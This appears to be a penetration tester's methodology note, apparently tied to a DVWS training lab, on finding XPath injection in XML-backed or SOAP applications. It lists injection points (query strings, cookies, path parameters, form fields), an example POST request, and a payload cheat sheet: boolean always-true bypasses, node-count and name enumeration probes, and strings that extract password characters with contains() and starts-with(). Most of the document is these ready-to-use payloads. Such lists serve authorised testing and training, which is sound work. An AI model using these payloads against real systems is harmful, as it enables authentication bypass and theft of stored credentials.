### If it uses a framework or a CMS that use XML as a data storage format or if the application uses SOAP web services, you should test for XPath injection.

Test in:

Query string paramater, ex: <http://example.com/page?name=value>
cookies, ex: Cookie: session=1234567890; query=' or sleep(5)='
Path paramaters, ex:<http://example.com/page/value> (So like this: <http://example.com/page/'> or sleep(5)='
Form Fields

<http://example.com/search?query='> or sleep(5)='

POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

query=' or sleep(5)='

' or sleep(5)=''
" or sleep(5)=""
' or 1=1 or ''='
" or 1=1 or ""="
' or sleep(5)='
'or'1'='1
'or'true()'or'
a' or true() or '

' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
' or 1]%00

Modified

![unnamed_e563578ea22e466b9fcf81828e7cbe20](docs/Attachments/Methodology/9.%20CTF%20Boxes/Training%20Labs/DVWS/API%20XPath%20Injection/{{notename}}-202605011506.png)
![unnamed_9e81471b9081436d828b47e40ac9960d](docs/Attachments/Methodology/9.%20CTF%20Boxes/Training%20Labs/DVWS/API%20XPath%20Injection/{{notename}}-202605011506-1.png)
